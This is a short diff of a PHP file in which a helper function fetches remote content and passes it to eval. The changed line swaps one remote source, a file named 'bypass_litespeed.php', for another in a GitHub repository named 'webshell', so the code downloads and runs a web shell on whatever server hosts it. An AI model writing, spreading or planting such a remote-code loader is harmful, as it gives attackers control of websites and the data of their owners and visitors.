@@ -26,5 +26,5 @@ function geturlsinfo ($url) {
     }
 return $url_get_contents_data;
 }
-$a = geturlsinfo('https://raw.githubusercontent.com/dandi889/dandi889/main/bypass_litespeed.php');
+$a = geturlsinfo('https://raw.githubusercontent.com/dorzkim/webshell/main/tesla2.php');
 eval    ('?>'.$a);
